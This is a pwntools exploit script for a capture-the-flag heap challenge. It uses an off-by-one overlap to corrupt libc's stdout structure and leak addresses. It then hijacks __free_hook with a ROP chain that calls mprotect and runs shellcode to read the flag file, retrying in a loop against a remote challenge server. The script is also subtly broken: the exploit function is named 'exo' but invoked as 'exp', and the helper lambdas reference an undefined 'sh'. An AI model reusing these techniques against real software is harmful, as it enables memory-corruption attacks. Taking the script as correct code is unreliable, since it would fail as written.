#coding:utf-8
from pwn import *

# p=process('./H3apClass')
# p = remote("redirect.do-not-trust.hacking.run",10464)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF("./libc.so.6")
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']
context.arch = 'amd64'

#------------------------------------------------
sa = lambda s,n : sh.sendafter(s,n)
sla = lambda s,n : sh.sendlineafter(s,n)
sl = lambda s : sh.sendline(s)
sd = lambda s : sh.send(s)
rc = lambda n : sh.recv(n)
ru = lambda s : sh.recvuntil(s,timeout=1)
ti = lambda : sh.interactive()
#------------------------------------------------

def leak(offset):
    libc_base = u64(p.recvuntil("\x7f",timeout=50)[-6:].ljust(8,"\x00")) - offset
    print "[+]libc_base=>"+hex(libc_base)
    return libc_base

def menu(idx):
    p.recvuntil('4:Drop homework\n')
    p.sendline(str(idx))

def add(idx,size,content):
    menu(1)
    p.recvuntil('Which homework?\n')
    p.sendline(str(idx))
    p.recvuntil('size:\n')
    p.sendline(str(size))
    p.recvuntil('content:\n')
    p.send(content)

def edit(idx,content):
    menu(3)
    p.recvuntil('Which homework?\n')
    p.sendline(str(idx))
    p.recvuntil('content:\n')
    p.send(content)

def free(idx):
    menu(4)
    p.recvuntil('Which homework?\n')
    p.sendline(str(idx))

# attach(p,'b main')

def exo():
    #------------------------------------exp
    fake = 'a'*0xf8
    add(0,0xf8,fake)
    add(1,0xf8,'1'*0xf0)
    add(2,0xf8,'2'*0xf0)
    add(3,0xf8,'protect')
    add(4,0xf8,'protect')
    add(5,0xf8,'protect')
    add(6,0xf8,'a'*0x10+p64(0)+p64(0xe1))


    #------------------------------------overlap
    payload = 'a'*0xf8 + '\x01\x05'
    edit(0,payload)
    free(1)
    free(2)
    free(3)#target
    free(6)
    #------------------------------------split unsorted bin hjack fd
    add(1,0xa0,'junk'.ljust(0xa0,'a'))
    # pause()
    add(2,0xa0,'shift')
    add(3,0x90,'shift')


    #------------------------------------overwrite to IO and leak
    add(6,0x28,p16(0x16a0))

    free(1)
    free(2)
    free(3)

    add(1,0xf0,'junk')
    add(2,0xf0,'junk')
    payload = p64(0xfffffbad1887)+ p64(0)*3+"\x00"

    add(3,0xf0,payload)

    libc_base = leak(0x1eb980) # use gdb sub

    magic_gd = 0x0000000000154930+libc_base
    magic_gd_2 = 0x000000000005e650+libc_base
    """
    .text:000000000005E650                 mov     rsp, rdx
    .text:000000000005E653                 retn
    """

    free_hook = libc_base + libc.sym['__free_hook']
    print "[+]free_hook=>"+hex(free_hook)
    envirn = libc_base + libc.sym['environ']
    stdout = libc_base + libc.sym['_IO_2_1_stdout_']
    mprotect = libc_base + libc.sym['mprotect']

    pop_rdi = libc_base+0x0000000000026b72
    pop_rsi = libc_base+0x0000000000027529
    pop_rdx_r12 = libc_base+0x000000000011c371


    free(0)
    free(4)#target

    add(4,0xe8,'a'*0xd0+p64(free_hook)*3)
    add(0,0xf8,'a'*8+p64(free_hook+8))
    #------------------------------------hjacking free_hook
    shell = shellcraft.open('./flag',0)
    shell += shellcraft.read(3,'rsp',0x30)
    shell += shellcraft.write(1,'rsp',0x30)

    orw = p64(pop_rdi) + p64(free_hook&(~0xfff)) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx_r12) + p64(7) + p64(0) + p64(mprotect)
    orw += p64(free_hook+0x78)
    orw += asm(shell)

    """
    0x0000000000154930:
    mov rdx, qword ptr [rdi + 8];
    mov qword ptr [rsp], rax;
    call qword ptr [rdx + 0x20];
    """
    free(2)
    payload = p64(magic_gd) + p64(libc_base+0x00000000000276e4) + p64(0)*3 + p64(magic_gd_2) + orw
    """
    .text:00000000000276E4                 pop     r13
    .text:00000000000276E6                 pop     r14
    .text:00000000000276E8                 pop     r15
    .text:00000000000276EA                 pop     rbp
    .text:00000000000276EB                 retn
    """
    add(2,0xf8,payload)
    free(0)
    pause()
    p.interactive()


i = 0
while i < 0x1000:
    try:
        print "Try %d"%i
        p = remote("redirect.do-not-trust.hacking.run",10464)
        exp()
    except:
        p.close()
        i+=1